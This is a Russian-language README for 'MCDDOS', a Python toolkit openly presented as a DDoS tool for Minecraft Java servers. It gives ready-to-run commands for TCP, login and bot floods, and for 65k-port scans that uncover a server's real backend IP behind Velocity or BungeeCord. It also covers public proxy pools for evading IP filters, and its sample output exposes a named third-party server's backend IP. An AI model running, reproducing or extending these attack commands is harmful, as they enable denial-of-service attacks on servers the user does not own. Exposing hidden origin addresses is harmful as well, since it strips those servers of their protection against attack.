<p align="center">
  <img src="https://img.shields.io/badge/Python-3.8+-3776AB?logo=python&logoColor=white" alt="Python 3.8+" />
  <img src="https://img.shields.io/badge/Зависимости-0%20внешних-green" alt="0 внешних зависимостей" />
  <img src="https://img.shields.io/badge/Версии-1.16%20→%2026.3-6CABFF" alt="1.16 -> 26.3" />
  <img src="https://img.shields.io/badge/Статус-сырая%20наработка-orange" alt="сырая наработка" />
  <img src="https://img.shields.io/badge/License-MIT-blue" alt="MIT" />
</p>

<h1 align="center">⚡ MCDDOS — Minecraft Java DDoS Toolkit</h1>

<p align="center">
  <b>Асинхронный Python-инструмент для нагрузки/атаки серверов Minecraft Java<br>
  1.16 → 26.3 (protocol 735–777)</b> — с обходом Velocity/BungeeCord, поиском реального IP<br>
  и авто-пулом прокси.
</p>

<p align="center">
  <a href="#-возможности">Возможности</a> ·
  <a href="#-быстрый-старт">Быстрый старт</a> ·
  <a href="#-авто-детект">Авто-детект</a> ·
  <a href="#-структура-проекта">Структура</a> ·
  <a href="#-это-сырая-наработка">Сырая наработка</a> ·
  <a href="#-если-вы-используете-или-дорабатываете-код">Доработка</a>
</p>

---

## 📖 Что это

**MCDDOS** — «ручной» (без тяжёлых библиотек) клиент Minecraft Java-протокола,
обёрнутый в инструменты для **нагрузки и диагностики** серверов. Протокол
реализован напрямую поверх `asyncio` + `zlib`: varint, frame-чтение,
`configuration` state, signed chat (1.19.3+), bundle (1.20.2+), compression —
сверено с `minecraft-data` и живыми серверами.

Пакет устанавливается как обычный Python-проект и ставит консольную команду
`mcddos`. **Никаких внешних Python-зависимостей** — только стандартная
библиотека.

### Что умеет

| Режим | Что делает |
|-------|-----------|
| `status` | Быстрый ping: версия / MOTD / игроки (без логина) |
| `tcp` | Сырой TCP-connect flood |
| `login` | Полный handshake → login → configuration → play (offline/cracked) |
| `bot` | Боты подключаются, держат соединение (keepalive i64), пишут в чат, переживают кики |
| `mixed` | Всё сразу: ping + tcp + login + боты |
| `realip` | Ищет **реальный IP+порт бэкенда** за Velocity/Bungee: SRV, prelogin, **полный порт-скан хоста 1024..65535** (UUID-ранжирование, login-пробы), subnet-скан |
| `proxies` | Авто-пул прокси: fetch публичных списков → верификация → переиспользование |
| `detect` | **Авто-детект**: сам находит версию + реальный IP + капчу/регистрацию |
| `playtest` | **Заход как реальный игрок**: логин + keepalive + чат + отчёт что произошло |

### Ключевые фишки

- 🚀 **Без зависимостей** — чистый `asyncio` + `zlib`, Python ≥ 3.8.
- 🎯 **Обход Velocity / BungeeCord** — скрипт сам находит настоящий IP+порт:
  SRV-запись, prelogin-сообщения, **MC status-скан всех 65k портов хоста**
  (бэкенд за Velocity сам себя не раскрывает), ранжирование кандидатов по
  совпадению UUID онлайн-игроков / MOTD-версии / online-mode кика.
- 🌐 **Прокси** — `http/https`, `socks4/4a`, `socks5/5h` (DNS через прокси),
  авто-загрузка и верификация публичных списков.
- 🤖 **Боты** — signed chat (Ed25519, чистый Python), keepalive, reconnect,
  переживают кики.
- 🔍 **Авто-детект** (`detect.py`) — версия, реальный IP и текст капчи
  в одном прогоне.

---

## 🚀 Быстрый старт

```bash
# 1) Установка (зависимостей нет, только python ≥ 3.8)
pip install .
# или без установки:
python3 -m mcddos ...

# 2) Спросить версию/MOTD/игроки
mcddos status play.example.com 25565

# 3) Нагрузка
mcddos ping  play.example.com 25565 -w 50 -t 60
mcddos tcp   play.example.com 25565 -w 100 -t 60
mcddos login play.example.com 25565 -v 1.20.4 -w 20 -t 60
mcddos bot   play.example.com 25565 -v 1.20.4 -n 30 --chat-every 5 -t 120
mcddos mixed play.example.com 25565 -v 1.20.4 -w 30 -n 10 -t 120
```

### Основные флаги

| флаг | смысл |
|------|-------|
| `-v, --version` | клиентская версия (`1.16`, `1.20.4`, `26.3`) или protocol (`765`) |
| `-w, --workers` | параллельные воркеры (ping/tcp/login/mixed) |
| `-n, --bott` | число ботов |
| `-t, --time` | длительность, сек (0 = до Ctrl-C) |
| `--proxy` | прокси `scheme://ip:port` (несколько) или путь к файлу со списком |
| `--fetch-proxies` | догрузить публичные списки прокси и верифицировать |
| `--realip` | найти реальный IP (prelogin + subnet-скан) |
| `--json` | JSON-вывод для `status`/`realip` |

---

## 🎮 PlayTest — заход как реальный игрок

`tools/playtest.py` — подключается к серверу **как настоящий игрок** и сам
определяет всё: **порт (SRV-запись, если не указан)**, версию,
**реальный IP+порт бэкенда** (SRV + prelogin + полный порт-скан хоста +
UUID-ранжирование), что произошло (в мире / кик / капча / регистрация /
whitelist / online mode). Держит соединение (keepalive), пишет в чат,
при необходимости логинится напрямую на найденный бэкенд и выдаёт подробный отчёт.

```bash
# базовый заход: порт можно НЕ указывать — скрипт сам возьмёт его из SRV
# (_minecraft._tcp) и сам найдёт реальный IP+порт бэкенда (~2-2.5 мин)
python3 tools/playtest.py play.example.com

# с указанием версии и длительностью
python3 tools/playtest.py play.example.com 25565 -v 1.20.4 --stay 90 --chat "hi"

# быстрый режим: без wide-скана хоста (~15-40 с, но бэкенд может не найтись)
python3 tools/playtest.py play.example.com --no-host-scan

# через прокси / авто-пул прокси (обход IP-фильтров)
python3 tools/playtest.py play.example.com --fetch 300
python3 tools/playtest.py play.example.com --proxy socks5://ip:port

# сохранить JSON-отчёт
python3 tools/playtest.py play.example.com --out report.json
```

Результат — JSON + сводка. Пример (снято на живом сервере CoreLand,
фронтенд за SRV 25795, бэкенд найден порт-сканом хоста по UUID игрока):
```
=== [0] DNS/TCP :: coreland.go-srv.top:25565 ===
  SRV _minecraft._tcp -> port 25795 (was 25565); using 25795
=== [1] Version detect ===
  -> version Paper 26.1.2 (protocol 775) via direct
=== [3] Real-IP discovery ===
  [realip] full MC status scan of 64511 ports on 193.37.71.193 ...
  [realip] best same-host backend guess: 193.37.71.193:25787 (score 85, match=True)

version  : Paper 26.1.2 (protocol 775)
real IP  : 193.37.71.193:25787 [same-host-portscan]
joined   : True  join_game=False
verdict  : JOINED (play state; соединение живое, keepalive ок)
# либо:  verdict  : CAPTCHA: Please solve the captcha ...
# либо:  verdict  : ONLINE MODE (нужен аккаунт, cracked не пройдёт)
```

---

## 🔍 Авто-детект

`detect.py` — главный сценарий: по `host:port` сам узнаёт **версию сервера**,
**реальный IP бэкенда** (за Velocity/Bungee) и **требование капчи/регистрации**.

```bash
# базовый запуск
python3 detect.py CoreLand.go-srv.top 25565

# через прокси (главный способ обойти IP-фильтры)
python3 detect.py HOST 25565 --proxy http://ip:port
python3 detect.py HOST 25565 --proxy socks5://ip:port:user:pass
python3 detect.py HOST 25565 --proxy-file data/prio_proxies.txt
python3 detect.py HOST 25565 --fetch 800 \
    --timeout 4 --workers 40 --max-login-proxies 300
```

Алгоритм (4 фазы):
1. **DNS/TCP** — резолв, проверка порта.
2. **Status sweep** — параллельно для всех источников (direct + прокси)
   пробует status по «вероятным» протоколам. Первый ответ → версия/protocol.
3. **Login → real IP** — полный offline-login; по `plugin_request` ловит
   `bungeecord:pre_login` / `velocity:pre_login` → реальный IP бэкенда.
4. **Капча/регистрация** — классификация текста кика
   (captcha / registration / whitelist / full / ban / online_mode).

Результат — JSON + человекочитаемая сводка.

---

## 🧩 Структура проекта

```
mcddos/                  ← основной пакет (pip install .)
  protocol.py            # Reader, varint/varlong/i64/i32, encode_field, handshake
  fields.py              # чтение полей по type-таблицам (NBT, buffer, option, ...)
  versions.py            # имя версии -> protocol (1.16..26.3)
  ed25519.py             # Ed25519 чистым Python (подписанный чат)
  mcconn.py              # ★ MCConn: handshake->status->login->config->play, прокси, prelogin
  bots.py                # Bot / BotPool: keepalive, signed chat, reconnect, прокси
  ddos.py                # потоки ping/tcp/login/mixed + статистика
  realip.py              # SRV, prelogin, wide-скан портов хоста, login-пробы, find_real_ip
  proxies.py             # parse/fetch (11 источников)/верификация прокси
  cli.py                 # argparse CLI → команда mcddos
  data/packets.json      # ★ ID пакетов по protocol-версии (735..777)

detect.py                # ★ авто-детект: версия + реальный IP + капча

tests/                   # локальные тесты (нужен node + minecraft-protocol)
  tsrv.js                # тестовый offline MC-сервер
  cproxy3.py             # локальный HTTP CONNECT-прокси
  smoke_*.py, chat_test.py, proxytest.py

tools/                   # диагностические / экспериментальные скрипты
  playtest.py          # ★ заход как реальный игрок + полный отчёт
  extract_*.py           # извлечение packets.json из minecraft-data
  check_proxies.py       # проверка живости прокси + гео egress-IP
  cl_*.py, coreland_*.py, rawlogin*, zraw*, fullscan*  # диагностика серверов

data/                    # образцы прокси и логи прогонов
pyproject.toml           # сборка: pip install . → mcddos
docs/INSTRUKCIYA.md      # подробная инструкция по проекту
```

### Протокольные нюансы (уже учтено)

- `keep_alive` = **i64** во всех версиях; `ping/pong` = i32.
- `login_acknowledged` ≥ 764; `configuration` state ≥ 764 (settings→finish).
- Signed chat ≥ 1.19.3 (Ed25519): timestamp/salt/signature,
  ≥ 1.20.3 + offset/acknowledged — всё кодируется по версии.
- Bundle (1.20.2+) id = 0; compression — varint-unescape.
- Прокси: HTTP CONNECT + SOCKS4/5/5h; DNS через `socks5h`.

### Локальные тесты (нужен node + `npm i minecraft-protocol`)

```bash
node tests/tsrv.js &      # тестовый offline-сервер
python3 tests/cproxy3.py &  # CONNECT-прокси на 3129
python3 tests/smoke_login.py   # login→play 1.16.5/1.19.2/1.20.4/1.21.1
python3 tests/chat_test.py     # signed chat без кика
python3 tests/smoke_keepalive.py  # боты 18s, 0 киков
python3 tests/proxytest.py     # status+login через HTTP-прокси
```

---

## 🛠 Это сырая наработка

> ⚠️ **Проект в рабочем (сыром) состоянии.** Логика проверена на живых
> серверах и на локальном тестовом сервере, но кодовой базы ещё нет:
> нет единой системы тестов, CI и полной документации по API.
> Ошибки, неочевидные места и «костыли» — это нормально для текущей версии.

Что уже **уверенно работает**:
- `status` / `login` на всех версиях 1.16 → 26.3 (offline-mode).
- Боты с keepalive и signed chat.
- Обход Velocity/Bungee + поиск реального IP.
- Прокси (http/socks), в т.ч. авто-пул.
- Авто-детект версии / реального IP / капчи.

Что **ещё можно полировать**:
- единый набор тестов + CI (сейчас тесты разрозненны в `tests/`),
- единый формат логов и ошибок,
- покрытие редких edge-cases протокола,
- nicer CLI-выход.

---

## 🤝 Если вы используете или дорабатываете код

Если берёте мой код и **дорабатываете** его, пожалуйста, соблюдайте
два простых правила:

1. **Указывайте моё соавторство.** В `README`, в `LICENSE`, в `CONTRIBUTORS`
   или в истории коммитов — где угодно, но обязательно. Автор: **shelex1**.
2. **Свяжитесь со мной, когда доделаете.** У меня пока не хватает навыков,
   чтобы полностью вести проект одному — буду рад, если доведёте до ума
   и расскажете, что сделали.

**Для связи — Telegram:** [@shelex1](https://t.me/shelex1)

---

## 📄 Лицензия

**MIT** (пока — «сырой» вариант; см. пункт про соавторство выше).

## ✍️ Автор

**shelex1** · [Telegram: @shelex1](https://t.me/shelex1) ·
[GitHub: shelex1/Minecraft-ddos](https://github.com/shelex1/Minecraft-ddos)

---

<p align="center"><sub>Сделано руками на чистом <code>asyncio</code> · без внешних Python-зависимостей</sub></p>
